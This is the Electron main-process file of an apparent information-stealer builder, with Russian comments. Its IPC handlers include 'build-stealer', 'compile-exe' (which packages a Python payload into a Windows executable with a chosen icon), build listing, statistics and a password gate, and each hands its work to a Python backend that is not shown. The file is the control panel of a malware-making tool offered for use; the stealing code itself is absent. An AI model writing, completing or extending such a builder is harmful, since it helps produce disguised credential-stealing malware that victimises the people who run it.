const { app, BrowserWindow, ipcMain, dialog, shell } = require('electron')
const path = require('path')
const { spawn } = require('child_process')
const fs = require('fs')
const crypto = require('crypto')

let win
let pyBackend

// Проверка целостности приложения
function checkIntegrity() {
  try {
    const appPath = app.getAppPath();
    const asarPath = path.join(appPath, '..', 'resources', 'app.asar');
    
    if (fs.existsSync(asarPath)) {
      const stats = fs.statSync(asarPath);
      // Простая проверка - можно улучшить с использованием хеша
      if (stats.size < 1000) {
        console.error('Integrity check failed: app.asar size suspicious');
        return false;
      }
    }
    return true;
  } catch (error) {
    console.error('Integrity check error:', error);
    return true; // В dev режиме пропускаем проверку
  }
}

function createWindow() {
  // Проверка целостности
  if (!checkIntegrity()) {
    dialog.showErrorBox('Ошибка', 'Обнаружено нарушение целостности приложения!');
    app.quit();
    return;
  }
  
  win = new BrowserWindow({
    width: 1400,
    height: 900,
    backgroundColor: '#1a1d23',
    titleBarStyle: 'hiddenInset',
    show: false,
    webPreferences: {
      preload: path.join(__dirname, 'preload.js'),
      contextIsolation: true,
      nodeIntegration: false,
      enableRemoteModule: false,
      sandbox: true
    }
  })
  
  win.loadFile(path.join(__dirname, 'renderer', 'index.html'))
  
  win.once('ready-to-show', () => {
    win.show()
    win.maximize()
    // Открываем консоль разработчика в dev режиме или по запросу
    if (process.env.NODE_ENV === 'development' || process.argv.includes('--dev')) {
      win.webContents.openDevTools()
    }
  })
  
  // Горячая клавиша для открытия консоли (Ctrl+Shift+I или F12)
  win.webContents.on('before-input-event', (event, input) => {
    if (input.control && input.shift && input.key.toLowerCase() === 'i') {
      win.webContents.toggleDevTools()
    }
    if (input.key === 'F12') {
      win.webContents.toggleDevTools()
    }
  })
}

app.whenReady().then(() => {
  createWindow()
  app.on('activate', () => {
    if (BrowserWindow.getAllWindows().length === 0) createWindow()
  })
})

app.on('window-all-closed', () => {
  if (process.platform !== 'darwin') app.quit()
})

ipcMain.handle('check-password', async (event, password) => {
  try {
    const pythonExe = process.platform === 'win32' ? 'python' : 'python3'
    const script = path.join(__dirname, 'builder_backend.py')
    
    const py = spawn(pythonExe, ['-u', script], { stdio: ['pipe', 'pipe', 'pipe'] })
    
    return new Promise((resolve) => {
      let output = ''
      let errorOutput = ''
      
      py.stdout.on('data', (data) => {
        output += data.toString()
      })
      
      py.stderr.on('data', (data) => {
        errorOutput += data.toString()
        console.error('Python stderr:', data.toString())
      })
      
      py.on('close', (code) => {
        try {
          const trimmed = output.trim()
          if (trimmed) {
            const result = JSON.parse(trimmed)
            resolve(result.result || false)
          } else {
            console.error('No output from Python script. Exit code:', code, 'Stderr:', errorOutput)
            resolve(false)
          }
        } catch (e) {
          console.error('Failed to parse Python output:', output, 'Error:', e, 'Stderr:', errorOutput)
          resolve(false)
        }
      })
      
      py.on('error', (err) => {
        console.error('Python spawn error:', err)
        resolve(false)
      })
      
      const request = JSON.stringify({ cmd: 'check_password', params: { password } }) + '\n'
      py.stdin.write(request)
      py.stdin.end()
    })
  } catch (error) {
    console.error('check-password error:', error)
    return false
  }
})

ipcMain.handle('build-stealer', async (event, config) => {
  try {
    const pythonExe = process.platform === 'win32' ? 'python' : 'python3'
    const script = path.join(__dirname, 'builder_backend.py')
    
    const py = spawn(pythonExe, [script], { stdio: ['pipe', 'pipe', 'pipe'] })
    
    return new Promise((resolve) => {
      let output = ''
      
      py.stdout.on('data', (data) => {
        output += data.toString()
      })
      
      py.on('close', () => {
        try {
          const result = JSON.parse(output.trim())
          resolve(result)
        } catch {
          resolve({ status: 'error', message: 'Failed to parse response' })
        }
      })
      
      py.stdin.write(JSON.stringify({ cmd: 'build', params: config }) + '\n')
      py.stdin.end()
    })
  } catch (error) {
    return { status: 'error', message: error.message }
  }
})

ipcMain.handle('compile-exe', async (event, pyPath, name, iconPath = null) => {
  try {
    const pythonExe = process.platform === 'win32' ? 'python' : 'python3'
    const script = path.join(__dirname, 'builder_backend.py')
    
    // Normalize icon path if provided
    let normalizedIconPath = null
    if (iconPath && iconPath.trim()) {
      normalizedIconPath = path.resolve(iconPath)
      if (!fs.existsSync(normalizedIconPath)) {
        normalizedIconPath = null
      }
    }
    
    const py = spawn(pythonExe, [script], { stdio: ['pipe', 'pipe', 'pipe'] })
    
    return new Promise((resolve) => {
      let output = ''
      
      py.stdout.on('data', (data) => {
        output += data.toString()
        if (win && !win.isDestroyed()) {
          win.webContents.send('compile-log', data.toString())
        }
      })
      
      py.stderr.on('data', (data) => {
        output += data.toString()
        if (win && !win.isDestroyed()) {
          win.webContents.send('compile-log', data.toString())
        }
      })
      
      py.on('close', () => {
        try {
          const result = JSON.parse(output.trim())
          resolve(result)
        } catch {
          resolve({ status: 'error', output: ['Failed to parse response', output] })
        }
      })
      
      py.stdin.write(JSON.stringify({ 
        cmd: 'compile', 
        params: { 
          path: pyPath, 
          name: name,
          icon_path: normalizedIconPath
        } 
      }) + '\n')
      py.stdin.end()
    })
  } catch (error) {
    return { status: 'error', output: [error.message] }
  }
})

ipcMain.handle('get-builds', async () => {
  try {
    const pythonExe = process.platform === 'win32' ? 'python' : 'python3'
    const script = path.join(__dirname, 'builder_backend.py')
    
    const py = spawn(pythonExe, [script], { stdio: ['pipe', 'pipe', 'pipe'] })
    
    return new Promise((resolve) => {
      let output = ''
      
      py.stdout.on('data', (data) => {
        output += data.toString()
      })
      
      py.on('close', () => {
        try {
          const result = JSON.parse(output.trim())
          resolve(result)
        } catch {
          resolve({ status: 'error', builds: [] })
        }
      })
      
      py.stdin.write(JSON.stringify({ cmd: 'get_builds' }) + '\n')
      py.stdin.end()
    })
  } catch (error) {
    return { status: 'error', builds: [] }
  }
})

ipcMain.handle('get-stats', async () => {
  try {
    const pythonExe = process.platform === 'win32' ? 'python' : 'python3'
    const script = path.join(__dirname, 'builder_backend.py')
    
    const py = spawn(pythonExe, [script], { stdio: ['pipe', 'pipe', 'pipe'] })
    
    return new Promise((resolve) => {
      let output = ''
      
      py.stdout.on('data', (data) => {
        output += data.toString()
      })
      
      py.on('close', () => {
        try {
          const result = JSON.parse(output.trim())
          resolve(result)
        } catch {
          resolve({ status: 'error', stats: {} })
        }
      })
      
      py.stdin.write(JSON.stringify({ cmd: 'get_stats' }) + '\n')
      py.stdin.end()
    })
  } catch (error) {
    return { status: 'error', stats: {} }
  }
})

ipcMain.handle('open-builds-folder', async () => {
  try {
    const buildsPath = path.join(__dirname, '..', 'builds')
    if (fs.existsSync(buildsPath)) {
      shell.openPath(buildsPath)
      return true
    }
    return false
  } catch (error) {
    return false
  }
})

ipcMain.handle('set-opacity', async (event, opacity) => {
  try {
    const window = BrowserWindow.getFocusedWindow() || win
    if (window) {
      window.setOpacity(parseFloat(opacity))
      return true
    }
    return false
  } catch (error) {
    return false
  }
})

ipcMain.handle('pick-folder', async () => {
  const result = await dialog.showOpenDialog(win, { 
    properties: ['openDirectory'],
    title: 'Выберите папку для сохранения'
  })
  if (result.canceled || !result.filePaths[0]) return null
  return result.filePaths[0]
})

ipcMain.handle('pick-icon-file', async () => {
  const result = await dialog.showOpenDialog(win, {
    properties: ['openFile'],
    title: 'Выберите иконку (.ico файл)',
    filters: [
      { name: 'Icon Files', extensions: ['ico'] },
      { name: 'All Files', extensions: ['*'] }
    ]
  })
  if (result.canceled || !result.filePaths[0]) return null
  return { filePath: result.filePaths[0] }
})
